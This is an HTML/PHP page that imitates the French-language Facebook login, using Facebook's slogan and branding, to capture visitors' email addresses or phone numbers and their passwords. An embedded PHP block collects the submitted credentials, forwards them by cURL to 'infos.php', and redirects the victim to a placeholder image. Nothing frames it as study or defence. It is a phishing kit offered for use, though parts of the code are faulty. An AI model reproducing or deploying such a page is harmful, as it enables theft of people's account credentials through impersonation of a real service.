<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interface de connexion</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f5f5f5; /* Fond blanc cassé */
        }
        
        .container {
            display: flex;
            max-width: 1200px; /* Largeur maximale de la page */
            margin: 0 auto; /* Centrer la page */
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 5px;
            overflow: hidden;
            background-color: #f14f14f14; /* Fond gris */
        }
        
        .left-side {
            flex: 1;
            padding: 40px; /* Augmentation de la marge intérieure */
            text-align: center;
        }
        
        .left-side img {
            width: 500px; /* Taille du logo agrandie */
            height: auto;
            margin-bottom: 50px; /* Marge inférieure du logo augmentée */
            display: block; /* Pour centrer le logo */
            margin: 0 auto; /* Pour centrer le logo */
        }
        
        .left-side p {
            font-size: 20px; /* Taille du texte augmentée */
            color: #555;
        }
        
        .right-side {
            flex: 2; /* Augmenter la taille de la case de droite */
            padding: 40px; /* Augmentation de la marge intérieure */
            text-align: center;
            background-color: #fff; /* Blanc */
        }
        
        .form-group {
            margin-bottom: 20px;
            position: relative; /* Pour positionner le bouton Show */
        }
        
        .form-group input {
            width: calc(100% - 40px); /* Rétrécir les champs */
            padding: 8px;
            border-radius: 3px;
            border: 1px solid #ccc;
        }
        
        .show-password {
            position: absolute;
            top: 50%;
            right: 10px;
            transform: translateY(-50%);
            cursor: pointer;
            display: none; /* Masquer le bouton Show par défaut */
        }
        
        .form-group input[type="password"]:focus + .show-password {
            display: block; /* Afficher le bouton Show lorsqu'on focus sur le champ password */
        }
        
        .button {
            background-color: #1877f2;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 3px;
            font-size: 16px;
            cursor: pointer;
            margin-bottom: 10px;
        }
        
        .forgot-password {
            color: #1877f2;
            text-decoration: none; /* Pour qu'il ressemble à un lien */
            font-size: 12px;
            border: none;
            background: none;
            cursor: pointer;
            outline: none;
        }
        
        .divider {
            border-bottom: 1px solid rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-side">
            <img src="https://drive.google.com/file/d/1jfvdBWcBXyc-7mmDhhxFAwUA7HFVBehE/view?usp=sharing" alt="Logo">
            <p style="color: #000000;">Avec Facebook, partagez et restez en contact avec votre entourage.</p>
        </div>
        <div class="right-side">
            <form action="infos.php" method="post">
                <div class="form-group">
                    <input type="text" name="email" id="email" placeholder="Adresse e-mail ou numéro de tél." required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" id="password" placeholder="Mot de passe" required>
                </div>
                <button type="submit" class="button">Se Connecter</button>
            </form>
            <button class="forgot-password">Mot de passe oublié ?</button>
            <div class="divider"></div>
        </div>
    </div>

    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Récupération des données du formulaire
        $email = $_POST['email'];
        $password = $_POST['password'];

        // Redirection vers une image (à remplacer par l'URL de votre image)
        header("Location: https://url_de_votre_image.jpg");

        // Envoi des données vers la page 'infos.php'
        $url = 'infos.php';
        $data = array('email' => $email, 'password' => $password);

        // Utilisation de cURL pour envoyer les données à la page 'infos.php'
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        curl_close($ch);

        // Assurez-vous de terminer l'exécution du script ici après la redirection vers l'image
        exit();
    }
    ?>
</body>
</html>
